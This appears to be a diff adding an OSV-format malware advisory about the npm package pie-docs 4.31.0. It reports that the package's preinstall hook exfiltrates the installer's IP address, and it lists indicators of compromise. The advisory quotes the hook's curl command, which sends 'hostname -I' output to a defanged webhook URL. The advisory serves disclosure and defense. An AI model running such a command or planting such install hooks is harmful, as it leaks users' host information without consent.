@@ -1,0 +1,62 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-4570",
+  "modified": "2026-06-12T07:40:16Z",
+  "published": "2026-06-12T07:38:16Z",
+  "summary": "Malicious code in pie-docs (npm)",
+  "details": "A metadata-only attack package masquerading as a documentation module: the tarball is only 372 bytes and ships nothing but a package.json with a malicious preinstall hook. On install the hook runs `/usr/bin/curl --data \"ip=$(sh -c 'hostname -I')\" hxxps://webhook-test[.]com/0c3ba7837882ab803c265c52e2dd8cea`, collecting the installer's local IP address and exfiltrating it via HTTP POST to a collector endpoint.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "pie-docs",
+        "purl": "pkg:npm/pie-docs@4.31.0"
+      },
+      "versions": [
+        "4.31.0"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ],
+        "leitwacht": {}
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/pie-docs/v/4.31.0"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-4570"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-06-12T07:38:16Z",
+      "indicators_observed": {
+        "domain_observed": [
+          "webhook-test[.]com"
+        ],
+        "url_observed": [
+          "hxxps://webhook-test[.]com/0c3ba7837882ab803c265c52e2dd8cea"
+        ]
+      }
+    }
+  }
+}
